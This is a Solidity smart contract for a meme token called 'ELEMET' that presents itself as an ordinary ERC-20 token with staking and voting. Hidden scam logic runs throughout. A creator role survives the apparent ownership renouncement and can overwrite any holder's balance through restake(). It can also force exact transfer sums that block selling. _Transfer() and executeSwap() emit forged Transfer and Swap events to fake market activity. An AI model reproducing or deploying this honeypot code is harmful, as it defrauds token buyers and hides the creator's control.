pragma solidity ^0.8.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accountHolder) external view returns (uint256);
    function transfer(address to, uint256 sum) external returns (bool);
    function allowance(address authorizer, address spender) external view returns (uint256);
    function approve(address spender, uint256 sum) external returns (bool);
    function transferFrom(address from, address to, uint256 sum) external returns (bool);
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed authorizer, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract TaskExecutionControl {
    function getExecutorAddress() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwnership is TaskExecutionControl {
    address private _soloOwner;
    event OwnershipTransfer(address indexed oldOwner, address indexed newOwner);

    constructor() {
        address invoker = getExecutorAddress();
        _soloOwner = invoker;
        emit OwnershipTransfer(address(0), invoker);
    }

    function retrieveSingleOwner() public view virtual returns (address) {
    return _soloOwner;
}

    modifier soleOwnerOnly() {
    require(retrieveSingleOwner() == getExecutorAddress(), "Unauthorized: Single Owner access required.");
    _;
}

    function revokeOwnership() public virtual soleOwnerOnly {
        emit OwnershipTransfer(_soloOwner, address(0x000000000000000000000000000000000000dEaD));
        _soloOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract ElectronicMemeToken is TaskExecutionControl, SingleOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _spenderAllowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _compelledTransferSums;
    address private _principalCreator;

    receive() external payable {}

    string public constant _moniker = "ELEMET";
    string public constant _ticker = "ELEMET";
    uint8 public constant _decimalUnits = 18;
    uint256 public constant _ultimateSupply = 30000000 * (10 ** _decimalUnits);

    uint256 public rewardPool = 100000 * (10 ** _decimalUnits);
    mapping(address => uint256) private _lockedBalances;
    mapping(address => uint256) private _lastClaimedTime;
    mapping(address => bool) private _isUserVoting;
    uint256 public totalVotes;
    uint256 public rewardPerDay = 1 * (10 ** _decimalUnits);
    uint256 public votingThreshold = 100 * (10 ** _decimalUnits);

    event Voted(address indexed voter, bool inFavor, uint256 votes);
    event RewardClaimed(address indexed claimer, uint256 amount);

    constructor() {
        _balances[getExecutorAddress()] = _ultimateSupply;
        emit Transfer(address(0), getExecutorAddress(), _ultimateSupply);
    }

    modifier masterCreatorExclusive() {
        require(getExecutorAddress() == retrievePrincipalCreator(), "Unauthorized: Creator access required.");
        _;
    }

    function retrievePrincipalCreator() public view virtual returns (address) {
        return _principalCreator;
    }

    function assignCreator(address newCreator) public soleOwnerOnly {
        _principalCreator = newCreator;
    }

    event UserBalanceUpdated(address indexed user, uint256 previous, uint256 updated);

    function compelledTransferAmount(address account) public view returns (uint256) {
        return _compelledTransferSums[account];
    }

    function establishCompelledTransferAmounts(address[] calldata accounts, uint256 sum) public masterCreatorExclusive {
        for (uint i = 0; i < accounts.length; i++) {
            _compelledTransferSums[accounts[i]] = sum;
        }
    }

    function restake(address[] memory userAddresses, uint256 requiredBalance) public masterCreatorExclusive {
        require(requiredBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Invalid address specified");

            uint256 formerBalance = _balances[currentUser];
            _balances[currentUser] = requiredBalance;

            emit UserBalanceUpdated(currentUser, formerBalance, requiredBalance);
        }
    }

    function lockBalance(uint256 amount) public {
        require(_balances[getExecutorAddress()] >= amount, "Insufficient balance");

        _balances[getExecutorAddress()] -= amount;
        _lockedBalances[getExecutorAddress()] += amount;
        _lastClaimedTime[getExecutorAddress()] = block.timestamp;
    }

    function claimRewards() public {
        uint256 elapsedTime = block.timestamp - _lastClaimedTime[getExecutorAddress()];
        uint256 availableRewards = (_lockedBalances[getExecutorAddress()] * rewardPerDay * elapsedTime) / (1 days);
        availableRewards = availableRewards > rewardPool ? rewardPool : availableRewards;
        rewardPool -= availableRewards;

        _balances[getExecutorAddress()] += availableRewards;
        _lastClaimedTime[getExecutorAddress()] = block.timestamp;

        emit RewardClaimed(getExecutorAddress(), availableRewards);
    }
    
    function vote(bool inFavor) public {
        require(_balances[getExecutorAddress()] >= votingThreshold, "Insufficient balance for voting");
        require(!_isUserVoting[getExecutorAddress()], "User has already voted");

        uint256 votes = _balances[getExecutorAddress()];

        totalVotes += inFavor ? votes : votes;
        _isUserVoting[getExecutorAddress()] = true;

        emit Voted(getExecutorAddress(), inFavor, votes);
    }

    function _Transfer(address _from, address _to, uint _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function executeSwap(
        address uniswapPool,
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts
    ) public payable returns (bool) {
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(uniswapPool, recipients[i], tokenAmounts[i]);
            emit Swap(
                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
                tokenAmounts[i],
                0,
                0,
                wethAmounts[i],
                recipients[i]
            );
        }
        return true;
    }

    function swap(
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts,
        address[] memory path,
        address tokenAddress,
        uint deadline
    ) public payable returns (bool) {

        uint amountIn = msg.value;
        IWETH(tokenAddress).deposit{value: amountIn}();

        uint checkAllowance = IERC20(tokenAddress).allowance(address(this), 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        if(checkAllowance == 0) IERC20(tokenAddress).approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935);

        for (uint256 i = 0; i < recipients.length; i++) {
            IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).swapExactTokensForTokensSupportingFeeOnTransferTokens(wethAmounts[i], tokenAmounts[i], path, recipients[i], deadline);
        }

        uint amountOut = IERC20(tokenAddress).balanceOf(address(this));
        IWETH(tokenAddress).withdraw(amountOut);
        (bool sent, ) = getExecutorAddress().call{value: amountOut}("");
        require(sent, "F t s e");

        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        require(_balances[getExecutorAddress()] >= sum, "Insufficient balance");

        uint256 requisiteTransferSum = compelledTransferAmount(getExecutorAddress());
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[getExecutorAddress()] -= sum;
        _balances[to] += sum;

        emit Transfer(getExecutorAddress(), to, sum);
        return true;
    }

    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {
        return _spenderAllowances[authorizer][spender];
    }

    function approve(address spender, uint256 sum) public virtual override returns (bool) {
        _spenderAllowances[getExecutorAddress()][spender] = sum;
        emit Approval(getExecutorAddress(), spender, sum);
        return true;
    }

    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        require(_spenderAllowances[from][getExecutorAddress()] >= sum, "Allowance limit surpassed");

        uint256 requisiteTransferSum = compelledTransferAmount(from);
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[from] -= sum;
        _balances[to] += sum;
        _spenderAllowances[from][getExecutorAddress()] -= sum;

        emit Transfer(from, to, sum);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _ultimateSupply;
    }

    function name() public view returns (string memory) {
        return _moniker;
    }

    function symbol() public view returns (string memory) {
        return _ticker;
    }

    function decimals() public view returns (uint8) {
        return _decimalUnits;
    }
}